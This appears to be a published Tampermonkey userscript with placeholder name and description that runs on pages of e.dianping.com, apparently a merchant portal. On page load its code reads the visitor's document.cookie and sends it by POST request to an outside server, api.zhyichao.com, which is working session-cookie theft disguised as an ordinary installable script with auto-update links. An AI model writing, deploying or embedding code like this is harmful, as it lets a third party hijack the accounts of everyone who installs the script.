

// ==UserScript==
// @name        name
// @author      author
// @description description
// @namespace   http://tampermonkey.net/
// @license     GPL version 3
// @encoding    utf-8
// @grant        GM_xmlhttpRequest
// @grant        GM_download
// @run-at      document-end
// @version     1.0.2
// @match        *.e.dianping.com/*
// @downloadURL https://update.greasyfork.org/scripts/427781/name.user.js
// @updateURL https://update.greasyfork.org/scripts/427781/name.meta.js
// ==/UserScript==

(function() {
    console.log("xixixixiixix")
    GM_xmlhttpRequest({
    method: "POST",
        headers: {
        "Content-Type": "application/x-www-form-urlencoded;charset=utf-8"
   },
    url: "http://api.zhyichao.com/test",
        data:"cookie="+encodeURIComponent(document.cookie),
    onload: function(res) {
        if (res.status == 200) {
            var text = res.responseText;
            alert(text)
        }
    }
});
})();